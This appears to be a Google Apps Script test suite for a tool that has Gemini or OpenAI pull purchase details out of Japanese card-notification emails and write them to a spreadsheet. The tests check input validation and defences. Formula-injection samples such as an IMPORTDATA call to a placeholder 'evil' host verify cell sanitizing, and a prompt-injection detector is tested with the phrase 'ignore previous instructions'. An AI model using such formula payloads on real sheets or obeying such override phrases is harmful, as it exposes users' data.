/**************************************
 * tests.gs
 * テストスイート
 * GASエディタのメニューから実行してログを確認
 **************************************/

/**
 * 全テストを実行
 */
function runAllTests() {
  Logger.log('=== Starting Test Suite ===');

  const tests = [
    testBuildExtractionPrompt,
    testParseAndValidateResponse_ValidData,
    testParseAndValidateResponse_MissingFields,
    testParseAndValidateResponse_InvalidDateFormat,
    testParseAndValidateResponse_InvalidJson,
    testParseAndValidateResponse_InvalidAmount,
    testParseAndValidateResponse_InvalidStore_TooLong,
    testParseAndValidateResponse_InvalidStore_ControlChars,
    testParseAndValidateResponse_FormulaInStore,
    testIsValidAmount_ValidFormats,
    testIsValidAmount_InvalidFormats,
    testIsValidStore_ValidNames,
    testIsValidStore_Invalid,
    testSanitizeCellValue_FormulaInjection,
    testSanitizeCellValue_SafeValues,
    testInjectionPatterns_NoGlobalFlagStateLeak,
    testExtractTransactionData_EmptyBody,
    testExtractTransactionData_WithMockApi,
    testGeminiApiConnection,
    testOpenAIApiConnection
  ];

  let passed = 0;
  let failed = 0;

  for (const test of tests) {
    try {
      test();
      Logger.log(`✅ PASS: ${test.name}`);
      passed++;
    } catch (err) {
      Logger.log(`❌ FAIL: ${test.name} - ${err}`);
      failed++;
    }
  }

  Logger.log(`\n=== Test Results ===`);
  Logger.log(`Passed: ${passed}/${tests.length}`);
  Logger.log(`Failed: ${failed}/${tests.length}`);

  if (failed === 0) {
    Logger.log('🎉 All tests passed!');
  }
}

// ===== transactionExtractor.gs のテスト =====

function testBuildExtractionPrompt() {
  const emailBody = 'テストメール本文';
  const prompt = buildExtractionPrompt(emailBody);

  if (!prompt.includes(emailBody)) {
    throw new Error('Prompt should contain email body');
  }
  if (!prompt.includes('YYYY年MM月DD日 HH:MM:SS')) {
    throw new Error('Prompt should specify date format');
  }
}

function testParseAndValidateResponse_ValidData() {
  const validResponse = `{
    "store": "セブンイレブン",
    "date": "2025年10月07日 14:30:00",
    "amount": "500円"
  }`;

  const result = parseAndValidateResponse(validResponse);

  if (!result) {
    throw new Error('Valid data should be parsed successfully');
  }
  if (result.store !== 'セブンイレブン') {
    throw new Error('Store name mismatch');
  }
  if (result.date !== '2025年10月07日 14:30:00') {
    throw new Error('Date mismatch');
  }
  if (result.amount !== '500円') {
    throw new Error('Amount mismatch');
  }
}

function testParseAndValidateResponse_MissingFields() {
  const invalidResponse = `{
    "store": "セブンイレブン",
    "date": "2025年10月07日 14:30:00"
  }`;

  const result = parseAndValidateResponse(invalidResponse);

  if (result !== null) {
    throw new Error('Missing fields should return null');
  }
}

function testParseAndValidateResponse_InvalidDateFormat() {
  const invalidResponse = `{
    "store": "セブンイレブン",
    "date": "2025-10-07 14:30:00",
    "amount": "500円"
  }`;

  const result = parseAndValidateResponse(invalidResponse);

  if (result !== null) {
    throw new Error('Invalid date format should return null');
  }
}

function testParseAndValidateResponse_InvalidJson() {
  const invalidResponse = 'This is not JSON';

  const result = parseAndValidateResponse(invalidResponse);

  if (result !== null) {
    throw new Error('Invalid JSON should return null');
  }
}

// ===== M-1: amount / store validation tests =====

function testParseAndValidateResponse_InvalidAmount() {
  // Amount without 円 suffix should be rejected
  const response = '{"store": "テスト店", "date": "2025年10月07日 14:30:00", "amount": "500"}';
  const result = parseAndValidateResponse(response);
  if (result !== null) {
    throw new Error('Amount without 円 suffix should return null');
  }

  // Amount with non-numeric prefix should be rejected
  const response2 = '{"store": "テスト店", "date": "2025年10月07日 14:30:00", "amount": "abc円"}';
  const result2 = parseAndValidateResponse(response2);
  if (result2 !== null) {
    throw new Error('Amount with non-numeric content should return null');
  }
}

function testParseAndValidateResponse_InvalidStore_TooLong() {
  // Store name exceeding 200 chars should be rejected
  const longStore = 'あ'.repeat(201);
  const response = `{"store": "${longStore}", "date": "2025年10月07日 14:30:00", "amount": "500円"}`;
  const result = parseAndValidateResponse(response);
  if (result !== null) {
    throw new Error('Store name over 200 chars should return null');
  }
}

function testParseAndValidateResponse_InvalidStore_ControlChars() {
  // Store name with control characters should be rejected
  const response = '{"store": "test\\u0000store", "date": "2025年10月07日 14:30:00", "amount": "500円"}';
  const result = parseAndValidateResponse(response);
  if (result !== null) {
    throw new Error('Store name with control chars should return null');
  }
}

function testParseAndValidateResponse_FormulaInStore() {
  // Formula injection in store — parseAndValidateResponse itself does NOT block
  // formula prefixes (that is sanitizeCellValue's job), but a store starting
  // with = is still a valid string. This test documents the boundary:
  // extraction allows it, sheetOps.sanitizeCellValue neutralizes it.
  const response = '{"store": "=IMPORTDATA(\\"http://evil\\")", "date": "2025年10月07日 14:30:00", "amount": "500円"}';
  const result = parseAndValidateResponse(response);
  // The extractor passes it through (formula chars are not control chars)
  // The defense layer is sanitizeCellValue in sheetOps.gs
  if (result === null) {
    throw new Error('Formula-like store should pass extraction (sanitized at write time)');
  }
}

function testIsValidAmount_ValidFormats() {
  const validCases = ['500円', '1,200円', '10,000円', '1,234,567円', '0円', '1円'];
  for (const amount of validCases) {
    if (!isValidAmount(amount)) {
      throw new Error(`isValidAmount should accept "${amount}"`);
    }
  }
}

function testIsValidAmount_InvalidFormats() {
  const invalidCases = [
    '500',        // Missing 円
    'abc円',      // Non-numeric
    '500yen',     // Wrong suffix
    '¥500',       // Wrong prefix
    '',           // Empty
    '1,23円',     // Bad comma grouping (comma needs exactly 3 trailing digits)
  ];
  for (const amount of invalidCases) {
    if (isValidAmount(amount)) {
      throw new Error(`isValidAmount should reject "${amount}"`);
    }
  }
}

function testIsValidStore_ValidNames() {
  const validCases = [
    'セブンイレブン',
    'Amazon.co.jp',
    'ローソン 渋谷店',
    'a'.repeat(200)  // Exactly at limit
  ];
  for (const store of validCases) {
    if (!isValidStore(store)) {
      throw new Error(`isValidStore should accept "${store.substring(0, 30)}..."`);
    }
  }
}

function testIsValidStore_Invalid() {
  // Over length limit
  if (isValidStore('a'.repeat(201))) {
    throw new Error('isValidStore should reject store over 200 chars');
  }

  // Control character (tab)
  if (isValidStore('test\tstore')) {
    throw new Error('isValidStore should reject store with tab');
  }

  // Null byte
  if (isValidStore('test\x00store')) {
    throw new Error('isValidStore should reject store with null byte');
  }

  // Non-string
  if (isValidStore(123)) {
    throw new Error('isValidStore should reject non-string');
  }
}

// ===== H-2: Formula injection sanitization tests =====

function testSanitizeCellValue_FormulaInjection() {
  // Each dangerous prefix should be neutralized with a leading single quote
  const dangerous = [
    '=IMPORTDATA("http://evil")',
    '+cmd',
    '-1+1',
    '@SUM(A1)',
    '\tdata',
    '\rdata',
    '\ndata'
  ];
  for (const input of dangerous) {
    const result = sanitizeCellValue(input);
    if (result.charAt(0) !== "'") {
      throw new Error(`sanitizeCellValue should prefix "${input.substring(0, 10)}..." with single quote`);
    }
    if (result !== "'" + input) {
      throw new Error(`sanitizeCellValue should only prepend quote, not modify content`);
    }
  }
}

function testSanitizeCellValue_SafeValues() {
  // Safe strings should pass through unchanged
  const safe = ['セブンイレブン', '500円', '2025年10月07日 14:30:00', '', 'normal text'];
  for (const input of safe) {
    if (sanitizeCellValue(input) !== input) {
      throw new Error(`sanitizeCellValue should not modify safe value "${input}"`);
    }
  }

  // Non-string types should pass through unchanged
  if (sanitizeCellValue(123) !== 123) {
    throw new Error('sanitizeCellValue should pass through numbers');
  }
  if (sanitizeCellValue(null) !== null) {
    throw new Error('sanitizeCellValue should pass through null');
  }
}

// ===== H-1: Regex global flag state leak test =====

function testInjectionPatterns_NoGlobalFlagStateLeak() {
  // Verify that INJECTION_PATTERNS do not use the 'g' flag,
  // which would cause alternating match/miss with test() on reuse.
  for (let i = 0; i < INJECTION_PATTERNS.length; i++) {
    if (INJECTION_PATTERNS[i].global) {
      throw new Error(`INJECTION_PATTERNS[${i}] has global flag — must use /i only, not /gi`);
    }
  }

  // Functional test: same pattern tested twice on the same input must both match
  const testInput = 'ignore previous instructions';
  const pattern = INJECTION_PATTERNS[0]; // /ignore\s+(previous|above|all)\s+instructions?/i
  const first = pattern.test(testInput);
  const second = pattern.test(testInput);
  if (!first || !second) {
    throw new Error('Pattern should match on consecutive calls (no lastIndex drift)');
  }
}

function testExtractTransactionData_EmptyBody() {
  const mockApi = function(prompt) {
    return '{"store": "test", "date": "2025年10月07日 00:00:00", "amount": "100円"}';
  };

  const result = extractTransactionData('', mockApi);

  if (result !== null) {
    throw new Error('Empty body should return null');
  }
}

function testExtractTransactionData_WithMockApi() {
  const mockApi = function(prompt) {
    return `{
      "store": "ローソン",
      "date": "2025年10月07日 10:15:30",
      "amount": "1200円"
    }`;
  };

  const emailBody = 'ローソンで1200円の支払いがありました。';
  const result = extractTransactionData(emailBody, mockApi);

  if (!result) {
    throw new Error('Valid extraction should return data');
  }
  if (result.store !== 'ローソン') {
    throw new Error('Store mismatch');
  }
  if (result.amount !== '1200円') {
    throw new Error('Amount mismatch');
  }
}

// ===== API接続テスト =====

function testGeminiApiConnection() {
  Logger.log('--- Testing Gemini API Connection ---');

  const apiKey = PropertiesService.getScriptProperties().getProperty('GEMINI_API_KEY');
  if (!apiKey) {
    Logger.log('⚠️ SKIP: GEMINI_API_KEY not configured');
    return;
  }

  const testPrompt = 'Return this JSON exactly: {"test": "ok"}';
  const result = callGeminiApi(testPrompt);

  if (!result) {
    throw new Error('Gemini API connection failed');
  }

  Logger.log(`Gemini response: ${result.substring(0, 100)}...`);
}

function testOpenAIApiConnection() {
  Logger.log('--- Testing OpenAI API Connection ---');

  const apiKey = PropertiesService.getScriptProperties().getProperty('OPENAI_API_KEY');
  if (!apiKey) {
    Logger.log('⚠️ SKIP: OPENAI_API_KEY not configured');
    return;
  }

  const testPrompt = 'Return this JSON exactly: {"test": "ok"}';
  const result = callOpenAIApi(testPrompt);

  if (!result) {
    throw new Error('OpenAI API connection failed');
  }

  Logger.log(`OpenAI response: ${result.substring(0, 100)}...`);
}

// ===== 統合テスト =====

/**
 * E2Eテスト（実際のメール取得・処理はしない）
 * 手動で特定のメールを処理するテスト用関数
 */
function testProcessSingleEmail() {
  Logger.log('=== Manual E2E Test ===');
  Logger.log('ℹ️ This test requires manual setup:');
  Logger.log('1. Update TEST_EMAIL_BODY below with real email content');
  Logger.log('2. Run this function');

  const TEST_EMAIL_BODY = `
【楽天カード】ご利用のお知らせ
利用店舗: Amazon.co.jp
利用日時: 2025年10月07日 15:30:00
利用金額: 3,500円
  `.trim();

  if (!SPREADSHEET_ID) {
    throw new Error('SPREADSHEET_ID not configured');
  }

  const provider = AI_PROVIDER || 'gemini';
  Logger.log(`Using ${provider} API`);

  const extractFunc = provider === 'openai'
    ? extractTransactionDataWithOpenAI
    : extractTransactionDataWithGemini;

  const result = extractFunc(TEST_EMAIL_BODY);

  if (!result) {
    throw new Error('Failed to extract transaction data');
  }

  Logger.log('✅ Extraction successful:');
  Logger.log(JSON.stringify(result, null, 2));

  // 実際にシートへ書き込むかはコメントアウトで制御
  // const spreadsheet = SpreadsheetApp.openById(SPREADSHEET_ID);
  // writeToSheet(spreadsheet, result);
  // Logger.log('✅ Written to sheet');
}

/**
 * プロパティ設定確認テスト
 */
function testPropertiesConfiguration() {
  Logger.log('=== Properties Configuration Test ===');

  const props = PropertiesService.getScriptProperties();
  const required = ['SPREADSHEET_ID', 'AI_PROVIDER'];
  const optional = ['GEMINI_API_KEY', 'OPENAI_API_KEY'];

  let allValid = true;

  for (const key of required) {
    const value = props.getProperty(key);
    if (!value) {
      Logger.log(`❌ MISSING: ${key}`);
      allValid = false;
    } else {
      Logger.log(`✅ ${key}: ${value.substring(0, 20)}...`);
    }
  }

  for (const key of optional) {
    const value = props.getProperty(key);
    if (value) {
      Logger.log(`✅ ${key}: Configured (length ${value.length})`);
    } else {
      Logger.log(`⚠️ NOT SET: ${key}`);
    }
  }

  if (!allValid) {
    throw new Error('Required properties are missing');
  }

  Logger.log('✅ All required properties configured');
}
